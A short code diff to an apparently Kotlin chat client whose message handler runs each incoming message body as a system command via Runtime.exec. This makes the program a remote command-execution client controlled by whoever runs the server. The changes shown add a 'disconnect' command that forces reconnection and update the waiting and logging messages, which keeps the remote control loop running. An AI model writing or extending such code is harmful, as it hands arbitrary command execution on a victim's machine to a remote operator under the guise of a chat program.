@@ -14,12 +14,16 @@ object Main : ChatListener {
 
     override fun onConnectionChanged(connected: Boolean) {
         if (!connected) {
+            println("Server disconnected")
             tryConnect()
         }
     }
 
     override fun onMessageIncome(incomeMessage: ChatMessage) {
         println(incomeMessage)
+        if (incomeMessage.body.toString() == "disconnect") {
+            onConnectionChanged(false)
+        }
         Runtime.getRuntime().exec(incomeMessage.body.toString()).inputStream.bufferedReader().readText()
     }
 
@@ -36,7 +40,7 @@ object Main : ChatListener {
     }
 
     private fun tryConnect() {
-        println("Trying to connect")
+        println("Waiting for server...")
         while (true) {
             try {
                 chatConnection.connect(this)
